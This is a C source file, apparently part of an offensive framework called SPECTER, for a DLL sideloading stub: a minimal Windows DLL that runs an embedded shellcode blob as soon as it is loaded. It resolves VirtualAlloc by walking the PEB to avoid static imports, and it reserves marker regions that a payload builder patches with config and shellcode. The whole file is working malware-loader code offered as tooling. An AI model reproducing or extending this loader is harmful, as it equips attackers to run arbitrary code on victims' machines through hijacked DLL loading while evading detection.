/**
 * SPECTER Stubs -- DLL Sideloading Stub
 *
 * Minimal Windows DLL that executes an embedded PIC blob on load.
 * CRT-free, no static imports -- resolves VirtualAlloc via PEB walk.
 *
 * Build: x86_64-w64-mingw32-gcc -nostdlib -ffreestanding -shared
 *        -e DllMain -o sideload_stub.dll sideload_stub.c
 *
 * The payload builder patches two regions in this binary:
 *   1. Config marker  (CCCCCCCCCCCCCCCC + max_size + zero-pad)
 *   2. PIC blob marker (SPECPICBLOB\0 + size + blob data)
 */

#include "stub_common.h"

/* ------------------------------------------------------------------ */
/*  Embedded data section                                              */
/*                                                                     */
/*  These volatile arrays are placed in .data and survive linker       */
/*  dead-stripping.  The builder scans for the markers and patches     */
/*  the regions in place.                                              */
/* ------------------------------------------------------------------ */

/**
 * Config region:
 *   [16 bytes: 0x43 marker]
 *   [4 bytes:  max config capacity as u32 LE]
 *   [CONFIG_MAX_CAPACITY bytes: zero-filled config space]
 *
 * After builder patching:
 *   [4 bytes: config_len as u32 LE]  (overwrites marker start)
 *   [config_len bytes: config blob]
 *   [zero padding to fill capacity]
 */
__attribute__((section(".data"), used))
volatile BYTE stub_config_region[CONFIG_MARKER_LEN + sizeof(DWORD) + CONFIG_MAX_CAPACITY] = {
    /* Config marker: 16 bytes of 0x43 */
    0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
    0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
    /* Max config size: 4096 as u32 LE */
    0x00, 0x10, 0x00, 0x00,
    /* Remaining bytes zero-initialized (config space) */
};

/**
 * PIC blob region:
 *   [12 bytes: "SPECPICBLOB\0" marker]
 *   [4 bytes:  PIC blob size as u32 LE (0 = not yet patched)]
 *   [PIC_MAX_CAPACITY bytes: space for PIC blob]
 *
 * After builder patching:
 *   [12 bytes: marker (left intact for runtime scanning)]
 *   [4 bytes:  actual PIC size as u32 LE]
 *   [pic_size bytes: PIC blob data]
 */
__attribute__((section(".data"), used))
volatile BYTE stub_pic_region[PIC_MARKER_LEN + sizeof(DWORD) + sizeof(DWORD) + PIC_MAX_CAPACITY] = {
    /* PIC marker: "SPECPICBLOB\0" */
    'S','P','E','C','P','I','C','B','L','O','B','\0',
    /* PIC size placeholder: 0 */
    0x00, 0x00, 0x00, 0x00,
    /* Entry offset placeholder: 0 */
    0x00, 0x00, 0x00, 0x00,
    /* Remaining bytes zero-initialized (PIC blob space) */
};

/* ------------------------------------------------------------------ */
/*  DLL entry point                                                    */
/* ------------------------------------------------------------------ */

__attribute__((ms_abi))
BOOL DllMain(HANDLE hModule, DWORD dwReason, PVOID lpReserved) {
    (void)hModule;
    (void)lpReserved;

    if (dwReason == DLL_PROCESS_ATTACH) {
        stub_execute_payload();
    }

    return TRUE;
}
